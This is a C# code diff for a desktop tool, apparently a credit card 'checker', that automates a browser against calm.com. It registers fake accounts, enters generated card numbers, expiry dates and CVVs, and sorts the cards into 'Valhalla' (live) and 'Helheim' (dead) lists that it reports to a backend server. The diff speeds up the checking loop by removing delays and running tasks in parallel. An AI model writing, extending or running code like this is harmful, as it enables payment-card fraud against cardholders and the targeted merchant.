@@ -20,7 +20,8 @@ namespace Asgard
 {
     public partial class Frigg : Form, IForm
     {
-        public new IClans Owner { get; set; }
+        public new IAesir Owner { get; set; }
+        public new IChecker OChecker { get; set; }
         private string Bin { set; get; }
         private string Quatity { set; get; }
         private int UserId { set; get; }
@@ -75,6 +76,8 @@ namespace Asgard
         SoundPlayer Valhalla;
         SoundPlayer Valkyrie;
 
+        private double OriginalCreditCardsCount;
+
         public Frigg()
         {
             InitializeComponent();
@@ -89,11 +92,12 @@ namespace Asgard
 
         public void InitializeParameters(params object[] parameters)
         {
-            if (parameters.Length == 3)
+            if (parameters.Length == 4)
             {
                 UserId = (int)parameters[0];
                 Token = parameters[1].ToString();
                 Owner = (Aesir)parameters[2];
+                OChecker = (Checker)parameters[3];
             }
         }
 
@@ -684,7 +688,7 @@ namespace Asgard
         #endregion
         #region Panel Console
         #region Methods
-        public async Task ConsoleProgressGeneral(string info, int value = 101, string status = null)
+        public async Task ConsoleProgressGeneral(string info, int value, string status = null)
         {
             try
             {
@@ -701,7 +705,7 @@ namespace Asgard
                     delay = 5000;
                 }
 
-                if (value != 101)
+                if (value < 100)
                 {
                     CircularProgressBarGeneral.Value = value;
                     CircularProgressBarGeneral.Text = CircularProgressBarGeneral.Value.ToString();
@@ -713,7 +717,7 @@ namespace Asgard
             catch (Exception) {/* throw;*/ }
         }
 
-        public async Task ConsoleProgressDetail(string info, int value = 101, string status = null)
+        public async Task ConsoleProgressDetail(string info, int value, string status = null)
         {
             try
             {
@@ -730,7 +734,7 @@ namespace Asgard
                     delay = 5000;
                 }
 
-                if (value != 101)
+                if (value < 100)
                 {
                     CircularProgressBarDetail.Value = value;
                     CircularProgressBarDetail.Text = CircularProgressBarDetail.Value.ToString();
@@ -960,6 +964,7 @@ namespace Asgard
                 IconButtonStop.IconColor = Color.White;
                 IconButtonStop.Enabled = true;
                 //running = true;
+                OriginalCreditCardsCount = CreditCards.Count;
                 await InvokeFrigg();
                 await ConsoleProgressGeneral("FRIGG REINA DE LOS ÆSIR.", 0);
                 await ConsoleProgressDetail("FRIGG REINA DE LOS ÆSIR.", 0);
@@ -1128,7 +1133,7 @@ namespace Asgard
                                 CreditCards[i].Add(GetDate()[0]);
                                 CreditCards[i].Add(GetDate()[1]);
                                 CreditCards[i].Add(GetCvv());
-                                await Task.Delay(50);
+                                //await Task.Delay(50);
                                 if (IconButtonGenerarStopClick)
                                 {
                                     IconButtonGenerarStopClick = false;
@@ -1601,7 +1606,7 @@ namespace Asgard
                         double progress = Convert.ToDouble((x + 1) * 100 / valkyriesCount);
                         await ConsoleProgressGeneral("Frigg hace llamado a Valquirias.", (int)Math.Round(progress));
                     }
-                    await Task.Delay(50);
+                    //await Task.Delay(50);
                     x++;
                 }
             }
@@ -1696,7 +1701,7 @@ namespace Asgard
                     {
                         listValkyries = string.Empty;
                     }
-                    await Task.Delay(50);
+                    //await Task.Delay(50);
                 }
                 TextBoxValkyrie.Text = listValkyries;
             }
@@ -1719,7 +1724,6 @@ namespace Asgard
 
                 tokenCancel = new CancellationTokenSource();
                 CancellationToken token = tokenCancel.Token;
-
                 frigg = await Task<bool>.Run(async () =>
                 {
                     if (!token.IsCancellationRequested)
@@ -1734,6 +1738,7 @@ namespace Asgard
             }
             catch (Exception) { }
 
+            ////await browser.Screenshot("100.Last_" + frigg.ToString() + "_" + Asatru.GetTimestamp(DateTime.Now));
             await browser.Kill("www.calm.com");
             await tokenCancel.Kill();
 
@@ -1800,18 +1805,20 @@ namespace Asgard
                 //}
                 if (CreditCards.Count > 0)
                 {
+                    await ConsoleProgressDetail("", 0);
                     await ConsoleProgressGeneral("Frigg requiere un sacrificio.", 0, "Fail");
                     await ConsoleProgressGeneral("Ofreciendo un sacrificio a Frigg.", 0, "Success");
                     await InvokeFrigg();
                 }
                 else
                 {
+                    await ConsoleProgressDetail("", 0);
                     await ConsoleProgressGeneral("Frigg encontro un elfo oscuro y se detuvo.", 0, "Fail");
                 }
             }
             await Task.Delay(2000);
-            await ConsoleProgressGeneral("FRIGG REINA DE LOS ÆSIR.", 0);
             await ConsoleProgressDetail("", 0);
+            await ConsoleProgressGeneral("FRIGG REINA DE LOS ÆSIR.", 0);
         }
 
         private async Task<bool> LoadBrowser()
@@ -1856,6 +1863,7 @@ namespace Asgard
 
             try
             {
+                ////await browser.Screenshot("0.LoadPage_" + Asatru.GetTimestamp(DateTime.Now));
                 await ConsoleProgressGeneral("Invocando a Frigg...", 3);
                 return await StartFrigg();
             }
@@ -1870,9 +1878,10 @@ namespace Asgard
         {
             try
             {
-                // browser.Screenshot("1.Load");
+                //browser.Screenshot("1.Load");
+                ////await browser.Screenshot("1.StartFrigg_" + Asatru.GetTimestamp(DateTime.Now));
                 await ConsoleProgressGeneral("Zombificando ambiente", 10);
-                await browser.ExecuteScript("function alert(){ return false; }");
+                await browser.DisableAlerts();
             }
             catch (Exception) { }
             //await Task.Delay(10000);
@@ -1891,6 +1900,7 @@ namespace Asgard
             try
             {
                 // browser.Screenshot("2.LogIn");
+                ////await browser.Screenshot("2.Login_" + Asatru.GetTimestamp(DateTime.Now));
                 await ConsoleProgressGeneral("Resolviendo teorema de Gibbs.", 30);
                 FullName = Faker.Person.FullName;
                 await browser.SendKeys("div.visible > div > div > form > div:nth-child(1) > div > input", Faker.Internet.Email());
@@ -1906,9 +1916,11 @@ namespace Asgard
             bool divModal = await browser.ElementInvisible("div.visible", "ExceptionLogIn");
             if (divModal)
             {
+                ////await browser.Screenshot("2.1.Login_" + Asatru.GetTimestamp(DateTime.Now));
                 bool divWait = await browser.ElementInvisible("#take-a-deep-breath", "ExceptionLogInWait");
                 if (divWait)
                 {
+                    ////await browser.Screenshot("2.2.Login_" + Asatru.GetTimestamp(DateTime.Now));
                     return await Last();
                 }
             }
@@ -1921,6 +1933,7 @@ namespace Asgard
             try
             {
                 // browser.Screenshot("3.Last");
+                ////await browser.Screenshot("3.Last_" + Asatru.GetTimestamp(DateTime.Now));
                 await ConsoleProgressGeneral("Mancillando reputaciones.", 50);
                 string listLiveCreditCard = string.Empty;
                 string listDieCreditCard = string.Empty;
@@ -1931,7 +1944,8 @@ namespace Asgard
                     DieCreditCards = new List<List<string>>();
                     int creditCardsCount = CreditCards.Count;
 
-                    int x = 50;
+                    //double x = 50 + CalcIncrementX(50);
+                    double x = 50;
                     for (int i = 0; i < creditCardsCount;)
                     {
                         await ConsoleProgressDetail("Cuidado con el dragón.", 0);
@@ -1939,15 +1953,6 @@ namespace Asgard
                         string month = Int32.Parse(CreditCards[i][1]).ToString();
                         string year = Int32.Parse(CreditCards[i][2].Substring(2, 2)).ToString();
                         string cvv = CreditCards[i][3];
-                        //string cvv = string.Empty;
-                        //if (CreditCards[i][3].Length == 4)
-                        //{
-                        //    cvv = "0000";
-                        //}
-                        //else
-                        //{
-                        //    cvv = "000";
-                        //}
 
                         bool latestData = await LatestData(number, month, year, cvv);
                         if (latestData)
@@ -1955,51 +1960,57 @@ namespace Asgard
                             bool forseti = await Forseti();
                             if (forseti)
                             {
-                                // browser.Screenshot(x.ToString() + ".Valhalla_" + number);
-                                await ConsoleProgressDetail(string.Join("|", CreditCards[i].ToArray()), 100, "Success");
+                                await ConsoleProgressDetail(string.Join("|", CreditCards[i].ToArray()), 100);
                                 if (TextBoxValhalla.Text == string.Empty)
                                 {
                                     listLiveCreditCard += string.Join("|", CreditCards[i].ToArray());
-                                    await Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                 }
                                 else
                                 {
                                     listLiveCreditCard = TextBoxValhalla.Text;
                                     listLiveCreditCard += "\r\n" + string.Join("|", CreditCards[i].ToArray());
-                                    await Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                 }
-                                await ReduceListCreditCards();
+
                                 TextBoxValhalla.Text = listLiveCreditCard;
-                                double progress = Convert.ToDouble((x + 1) * 100 / creditCardsCount);
-                                await ConsoleProgressGeneral("Trazando retículas irreticulizables.", (int)Math.Round(progress));
-                                await Task.Delay(50);
-                                x++;
+
+                                IEnumerable<Task> tasks = new Task[] {
+                                    Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray())),
+                                    ReduceListCreditCards(),
+                                    Block(),
+                                    OChecker.SetLabelGetRunes()
+                                };
+
+                                await Task.Run(() => Task.WhenAll(tasks));
+
+                                x += CalcIncrementX(50);
+                                await ConsoleProgressGeneral("Trazando retículas irreticulizables.", (int)Math.Round(x));
                                 return false;
                             }
                             else
                             {
                                 if (!forsetiError)
                                 {
-                                    await ConsoleProgressDetail(string.Join("|", CreditCards[i].ToArray()), 100, "Fail");
+                                    await ConsoleProgressDetail(string.Join("|", CreditCards[i].ToArray()), 100);
                                     if (TextBoxHelheim.Text == string.Empty)
                                     {
                                         listDieCreditCard += string.Join("|", CreditCards[i].ToArray());
-                                        await Asatru.SetHelheim(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
-
                                     }
                                     else
                                     {
                                         listDieCreditCard = TextBoxHelheim.Text;
                                         listDieCreditCard += "\r\n" + string.Join("|", CreditCards[i].ToArray());
-                                        await Asatru.SetHelheim(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                     }
 
-                                    await ReduceListCreditCards();
+                                    IEnumerable<Task> tasks = new Task[] {
+                                        Asatru.SetHelheim(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray())),
+                                        ReduceListCreditCards()
+                                    };
+
+                                    await Task.WhenAll(tasks);
+
                                     TextBoxHelheim.Text = listDieCreditCard;
-                                    double progress = Convert.ToDouble((x + 1) * 100 / creditCardsCount);
-                                    await ConsoleProgressGeneral("Trazando retículas irreticulizables.", (int)Math.Round(progress));
-                                    await Task.Delay(50);
-                                    x++;
+                                    x += CalcIncrementX(50);
+                                    await ConsoleProgressGeneral("Trazando retículas irreticulizables.", (int)Math.Round(x));
                                     continue;
                                 }
                                 else
@@ -2027,7 +2038,7 @@ namespace Asgard
         {
             try
             {
-                // browser.Screenshot("4.LatestData");
+                ////await browser.Screenshot("4.LatestData_" + Asatru.GetTimestamp(DateTime.Now));
                 await ConsoleProgressDetail("Fregando animaciones.", 50);
 
                 await browser.SendKeys("#id-first-name > input[type=text]", FullName);
@@ -2040,9 +2051,7 @@ namespace Asgard
                 await browser.SendKeyCode(0x09);
                 string clickContinue = @"document.querySelector('button[type=submit]').click();";
                 await browser.ExecuteScript(clickContinue);
-                await Task.Delay(3000);
                 return true;
-
             }
             catch (Exception) { }
             await ConsoleProgressDetail("Fregando animaciones. ¡Fallo!", 90, "Fail");
@@ -2053,44 +2062,38 @@ namespace Asgard
         {
             try
             {
-                bool homepage = await browser.ElementVisible("#content-app", "ExceptionForsetiValhallaHomepage");
-                if (homepage)
+                await ConsoleProgressDetail("Eliminando trucos potenciales.", 90);
+                bool divErrorCardNumber = await browser.ElementVisible("#card-number > div:nth-child(2)", "ExceptionForsetiHelheimDivErrorCardNumber", 10);
+                if (divErrorCardNumber)
                 {
-                    // browser.Screenshot("5.3.Forseti");
-                    return true;
+                    await browser.LoadPage(browser.Address);
+                    return false;
                 }
                 else
                 {
-                    // browser.Screenshot("5.Forseti");
-                    await ConsoleProgressDetail("Eliminando trucos potenciales.", 90);
-                    bool divErrorCardNumber = await browser.ElementVisible("#card-number > div:nth-child(2)", "ExceptionForsetiHelheimDivErrorCardNumber", 10);
-                    if (divErrorCardNumber)
+                    bool status = false;
+                    for (int i = 0; i < 10; i++)
                     {
-                        // browser.Screenshot("5.1.Forseti");
-                        browser.Reload();
-                        await Task.Delay(3000);
+                        string getButtonStatus = "document.querySelector('form > button[type=submit]').getAttribute('class').includes('disabled')";
+                        if ((bool)await browser.ExecuteScript(getButtonStatus))
+                        {
+                            status = true;
+                            break;
+                        }
+                        await Task.Delay(1000);
+                    }
+
+                    if (status)
+                    {
+                        await browser.LoadPage(browser.Address);
                         return false;
                     }
                     else
                     {
-                        bool status = false;
-                        for (int i = 0; i < 10; i++)
+                        bool homepage = await browser.ElementVisible("#content-app", "ExceptionForsetiValhallaHomepage");
+                        if (homepage)
                         {
-                            string getButtonStatus = "document.querySelector('form > button[type=submit]').getAttribute('class').includes('disabled')";
-                            if ((bool)await browser.ExecuteScript(getButtonStatus))
-                            {
-                                status = true;
-                                break;
-                            }
-                            await Task.Delay(1000);
-                        }
-
-                        if (status)
-                        {
-                            // browser.Screenshot("5.2.Forseti");
-                            browser.Reload();
-                            await Task.Delay(3000);
-                            return false;
+                            return true;
                         }
                     }
                 }
@@ -2128,7 +2131,7 @@ namespace Asgard
                     {
                         listCreditCard = string.Empty;
                     }
-                    await Task.Delay(50);
+                    //await Task.Delay(50);
                 }
                 TextBoxCreditCards.Text = listCreditCard;
             }
@@ -2136,10 +2139,16 @@ namespace Asgard
             catch (Exception) {/* throw; */}
         }
 
-        //public void HideIconActive(string god)
-        //{
-        //    throw new NotImplementedException();
-        //}
+        private double CalcIncrementX(double value)
+        {
+            try
+            {
+                double x = value / OriginalCreditCardsCount;
+                return x;
+            }
+            catch (Exception) { }
+            return 0;
+        }
         #endregion
 
         #endregion
@@ -2169,11 +2178,6 @@ namespace Asgard
                 }
                 this.Close();
             }
-        }
-
-        private void PanelBlockGate_Paint(object sender, PaintEventArgs e)
-        {
-
         }
     }
 }
